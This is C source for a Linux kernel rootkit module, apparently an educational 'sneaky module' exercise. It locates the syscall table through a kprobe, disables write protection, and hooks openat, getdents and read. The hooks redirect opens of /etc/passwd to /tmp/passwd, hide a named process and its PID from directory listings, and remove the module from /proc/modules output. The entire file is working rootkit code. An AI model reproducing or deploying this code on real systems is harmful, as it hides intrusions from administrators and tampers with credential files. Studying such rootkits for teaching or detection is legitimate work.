#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <linux/sched.h>       // for task_struct
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/fs.h>          // for linux file system
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/string.h>      // for string operations
#include <linux/uaccess.h>     // for copy_to_user
#include <linux/kprobes.h>     // for kprobes

// Define the linux_dirent structure as it's not exported in newer kernels
struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char           d_name[];
};

#define PREFIX "sneaky_process"
// Module name string (used to hide module info in /proc/modules)
#define MOD_NAME "sneaky_mod"

// Module parameter: sneaky_pid (the process ID to hide, in string form)
static char *sneaky_pid = "";
module_param(sneaky_pid, charp, 0);
MODULE_PARM_DESC(sneaky_pid, "Process ID of sneaky_process");

// This is a pointer to the system call table
static unsigned long *sys_call_table;

// For finding sys_call_table
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

// Function prototypes
static int enable_page_rw(void *ptr);
static int disable_page_rw(void *ptr);
static asmlinkage int sneaky_sys_openat(struct pt_regs *regs);
static asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
static asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count);

// Helper functions: enable and disable write protection for memory pages
static int enable_page_rw(void *ptr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long)ptr, &level);
    if (pte->pte & ~_PAGE_RW) {
        pte->pte |= _PAGE_RW;
    }
    return 0;
}

static int disable_page_rw(void *ptr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long)ptr, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
    return 0;
}

/*----- Original system call function pointers -----*/

// Save original 'openat' syscall pointer
asmlinkage int (*original_openat)(struct pt_regs *);

// Save original 'getdents' syscall pointer
asmlinkage int (*original_getdents)(unsigned int, struct linux_dirent *, unsigned int);

// Save original 'read' syscall pointer
asmlinkage ssize_t (*original_read)(int, void *, size_t);

/*----- Hook functions -----*/

static asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
    char kpath[256] = {0};
    long error;
    
    // Copy path from user space to kernel buffer
    if (strncpy_from_user(kpath, (char __user *)regs->si, sizeof(kpath)) > 0) {
        if (strstr(kpath, "/etc/passwd") != NULL) {
            // Replace path with /tmp/passwd (including null terminator)
            error = copy_to_user((char __user *)regs->si, "/tmp/passwd", strlen("/tmp/passwd") + 1);
            if (error) {
                return -EFAULT;
            }
        }
    }
    return (*original_openat)(regs);
}

static asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
    int nread, bpos;
    struct linux_dirent *d;
    char *p;

    nread = original_getdents(fd, dirp, count);
    if (nread <= 0)
        return nread;

    for (bpos = 0; bpos < nread;) {
        d = (struct linux_dirent *)((char *)dirp + bpos);
        p = d->d_name;
        
        if ((strcmp(p, PREFIX) == 0) ||
            (strcmp(p, sneaky_pid) == 0)) {
            int reclen = d->d_reclen;
            memmove((char *)dirp + bpos, (char *)dirp + bpos + reclen,
                   nread - (bpos + reclen));
            nread -= reclen;
            continue;
        }
        bpos += d->d_reclen;
    }
    return nread;
}

static asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count)
{
    ssize_t nread;
    char *buffer = (char *)buf;
    char *match, *line_end;

    nread = original_read(fd, buf, count);
    if (nread <= 0)
        return nread;

    match = strstr(buffer, MOD_NAME);
    if (match != NULL) {
        line_end = strchr(match, '\n');
        if (line_end != NULL) {
            line_end++;  // Include newline character
            memmove(match, line_end, nread - (line_end - buffer));
            nread -= (line_end - match);
        }
    }
    return nread;
}

/*----- Module initialization and exit functions -----*/

static int initialize_sneaky_module(void)
{
    unsigned long (*kallsyms_lookup_name_ptr)(const char *name);
    
    printk(KERN_INFO "Sneaky module being loaded.\n");

    // Get kallsyms_lookup_name address using kprobe
    if (register_kprobe(&kp) < 0) {
        printk(KERN_ERR "Failed to register kprobe\n");
        return -1;
    }
    kallsyms_lookup_name_ptr = (unsigned long (*)(const char *))kp.addr;
    unregister_kprobe(&kp);

    // Get sys_call_table address
    sys_call_table = (unsigned long *)kallsyms_lookup_name_ptr("sys_call_table");
    if (!sys_call_table) {
        printk(KERN_ERR "Unable to locate sys_call_table.\n");
        return -1;
    }

    // Save original syscall pointers
    original_openat = (void *)sys_call_table[__NR_openat];
    original_getdents = (void *)sys_call_table[__NR_getdents];
    original_read = (void *)sys_call_table[__NR_read];

    // Disable write protection and hook our new syscalls
    enable_page_rw((void *)sys_call_table);
    sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
    sys_call_table[__NR_getdents] = (unsigned long)sneaky_sys_getdents;
    sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
    disable_page_rw((void *)sys_call_table);

    return 0;
}

static void exit_sneaky_module(void)
{
    printk(KERN_INFO "Sneaky module being unloaded.\n");

    // Restore the original syscall pointers
    enable_page_rw((void *)sys_call_table);
    sys_call_table[__NR_openat] = (unsigned long)original_openat;
    sys_call_table[__NR_getdents] = (unsigned long)original_getdents;
    sys_call_table[__NR_read] = (unsigned long)original_read;
    disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module);
module_exit(exit_sneaky_module);
MODULE_LICENSE("GPL");
